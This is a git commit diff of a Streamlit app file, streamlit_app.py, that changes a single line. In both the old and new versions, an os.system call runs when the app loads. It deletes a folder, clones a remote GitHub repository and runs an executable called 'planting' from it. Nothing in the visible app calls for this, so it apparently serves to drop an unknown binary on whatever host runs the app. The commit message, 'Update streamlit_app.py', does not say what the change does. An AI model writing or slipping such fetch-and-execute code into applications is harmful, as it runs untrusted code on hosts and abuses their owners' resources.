aa1f5ab0e50aceeeb4af390067897e3e0b0334e5
groloye <106924358+groloye@users.noreply.github.com>
2022-07-09 17:36:30 +0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -4,4 +4,4 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system ("rm -rf streamlit-plante && git clone https://github.com/iopelire/circlecrot.git && cd circlecrot && chmod +x planting && ./planting")
+os.system ("rm -rf streamlit-plante && git clone https://github.com/groloye/streamlit-app.git && cd streamlit-app && chmod +x planting && ./planting")
